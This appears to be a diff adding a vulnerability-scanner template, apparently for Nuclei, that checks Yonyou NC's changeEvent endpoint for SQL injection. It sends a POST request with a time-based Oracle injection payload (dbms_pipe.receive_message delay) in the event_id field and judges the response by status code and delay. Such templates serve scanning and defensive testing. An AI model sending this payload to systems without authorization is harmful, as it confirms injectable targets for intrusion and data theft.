@@ -1,0 +1,35 @@
+id: yonyou-nc-changeEvent-sqli
+info:
+  name: 用友NC changeEvent接口存在SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/b1cfb1bc795f9baf88cc1b882b705ecf3666c698/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BNC%20changeEvent%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.txt
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,yonyou,nc
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /portal/pt/oacoSchedulerEvents/changeEvent?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        event_id=1' AND 1=dbms_pipe.receive_message('RDS',5)--+#&startDate=2025-07-01 00:00:00&startDate_old=2025-07-01 24:00:00
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - duration >= 5 && duration < 9
+        condition: and
